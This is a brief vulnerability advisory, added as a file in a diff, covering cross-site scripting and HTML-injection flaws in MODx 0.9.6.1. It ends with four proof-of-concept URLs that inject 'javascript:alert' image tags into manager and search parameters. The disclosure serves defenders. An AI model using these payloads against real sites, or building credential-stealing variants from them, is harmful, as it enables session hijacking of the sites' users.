@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/27672/info
+
+MODx is prone to an HTML-injection vulnerability and multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+MODx 0.9.6.1 and 0.9.6.1p1 are vulnerable; other versions may also be affected. 
+
+http://www.example.com/[installdir]/manager/index.php?a=75&search="><IMG 
+SRC="javascript:alert(&#039;DSecRG XSS&#039;)
+http://www.example.com/[installdir]/manager/index.php?a=84&search="><IMG 
+SRC="javascript:alert(&#039;DSecRG XSS&#039;) 
+http://www.example.com/[installdir]/index.php?searched=modx&highlight="><IMG 
+SRC="javascript:alert(&#039;DSecRG XSS&#039;) 
+http://www.example.com/[installdir]/manager/index.php?a=&#039;<img 
+src="javascript:alert(&#039;DSecRG XSS&#039;)"> 
